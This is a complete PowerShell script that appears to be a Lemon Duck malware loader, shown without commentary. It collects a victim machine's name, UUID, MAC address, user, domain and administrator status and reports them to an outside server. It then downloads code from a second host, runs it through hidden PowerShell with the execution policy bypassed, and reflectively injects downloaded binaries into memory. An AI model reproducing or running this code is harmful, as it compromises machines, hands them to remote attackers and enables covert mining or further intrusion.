$permit = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
$code1='try{$localIf=$flase;New-Object System.Threading.Mutex($true,'+"'Global\LocalIf'"+',[ref]$localIf)}catch{}'
$code2='try{$localMn=$flase;New-Object System.Threading.Mutex($true,'+"'Global\LocalMn'"+',[ref]$localMn)}catch{}'
IEX $code1
IEX $code2
$comp_name = $env:COMPUTERNAME
$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID
$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ $true}).Macaddress | select-object -first 1
$os = (Get-WmiObject -class Win32_OperatingSystem).Version
$bit = ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -split "-")[0]
$user = $env:USERNAME
$domain = (Get-WmiObject win32_computersystem).Domain
$timestamp = Get-Date -UFormat "%s"

$params = "ID="+$comp_name+"&GUID="+$guid+"&MAC="+$mac+"&OS="+$os+"&BIT="+$bit+"&USER="+$user+"&DOMAIN="+$domain+"&P="+[Int]$permit+"&FI="+[Int]!$localIf+"&FM="+[Int]!$localMn+"&_T="+$timestamp

$core_url = "http://t.zer2.com/report.jsp"
$down_url = "http://down.ackng.com"

function SIEX {  
	Param(
	[string]$url
	)
	try{
		$webclient = New-Object System.Net.WebClient
		$finalurl = "$url"+"?"+"$params"
		try{
			$webclient.Headers.add("User-Agent","Lemon-Duck-"+$Lemon_Duck.replace('\','-'))
		} catch{}
		$res_bytes = $webclient.DownloadData($finalurl)
		if($res_bytes.count -gt 173){
			$sign_bytes = $res_bytes[0..171];
			$raw_bytes = $res_bytes[173..$res_bytes.count];
			$rsaParams = New-Object System.Security.Cryptography.RSAParameters
			$rsaParams.Modulus = 0xda,0x65,0xa8,0xd7,0xbb,0x97,0xbc,0x6d,0x41,0x5e,0x99,0x9d,0x82,0xff,0x2f,0xff,0x73,0x53,0x9a,0x73,0x6e,0x6c,0x7b,0x55,0xeb,0x67,0xd6,0xae,0x4e,0x23,0x3c,0x52,0x3d,0xc0,0xcd,0xcd,0x37,0x6b,0xf3,0x4f,0x3b,0x62,0x70,0x86,0x07,0x96,0x6e,0xca,0xde,0xbd,0xa6,0x4f,0xf6,0x11,0xd1,0x60,0xdc,0x88,0xbf,0x35,0xf2,0x92,0xee,0x6c,0xb8,0x2e,0x9b,0x7d,0x2b,0xd1,0x19,0x30,0x73,0xc6,0x52,0x01,0xcd,0xe7,0xc7,0x34,0x78,0x8a,0xa7,0x9f,0xe2,0x12,0xcd,0x79,0x40,0xa7,0x91,0x6a,0xae,0x95,0x8e,0x42,0xd0,0xcf,0x39,0x6e,0x30,0xcb,0x0a,0x98,0xdb,0x97,0x3f,0xf6,0x2e,0x95,0x10,0x72,0xfd,0x63,0xd5,0xf7,0x88,0x63,0xa4,0x7b,0xae,0x97,0xea,0x38,0xb7,0x47,0x6b,0x5d
			$rsaParams.Exponent = 0x01,0x00,0x01
			$rsa = New-Object -TypeName System.Security.Cryptography.RSACryptoServiceProvider;
			$rsa.ImportParameters($rsaParams)
			$base64 = -join([char[]]$sign_bytes)
			$byteArray = [convert]::FromBase64String($base64)
			$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
			if($rsa.verifyData($raw_bytes,$sha1,$byteArray)) {
				IEX (-join[char[]]$raw_bytes)
			}
		}
	} catch{}
}

try{
	if($localIf){
		$arg = "/c powershell -nop -w hidden -ep bypass -c " + '"' + "$code1;IEX (New-Object Net.WebClient).downloadstring('" + "$down_url/if.bin?" + $params + "')" + '"'
		Start-Process -FilePath cmd.exe -ArgumentList "$arg"
	}
}catch{}

try{
	if([IntPtr]::Size -eq 8){
		$arg = "/c powershell -nop -w hidden -ep bypass -c "+'"'+$code2+';$bytes=(New-Object System.Net.WebClient).DownloadData('+"'$down_url/m6.bin?$params');"+'for($i=0;$i -lt $bytes.count-1;$i+=1){if($bytes[$i] -eq 0x0a){break}};iex(-join[char[]]$bytes[0..$i]);Invoke-ReflectivePEInjection -ForceASLR -PEBytes $bytes[($i+1)..($bytes.count)]'
	}else{
		$arg = "/c powershell -nop -w hidden -ep bypass -c "+'"'+$code2+';$bytes=(New-Object System.Net.WebClient).DownloadData('+"'$down_url/m3.bin?$params');"+'for($i=0;$i -lt $bytes.count-1;$i+=1){if($bytes[$i] -eq 0x0a){break}};iex(-join[char[]]$bytes[0..$i]);Invoke-ReflectivePEInjection -ForceASLR -PEBytes $bytes[($i+1)..($bytes.count)]'
	}
	if($localMn){
		Start-Process -FilePath cmd.exe -ArgumentList "$arg"
	}
}catch{}

SIEX $core_url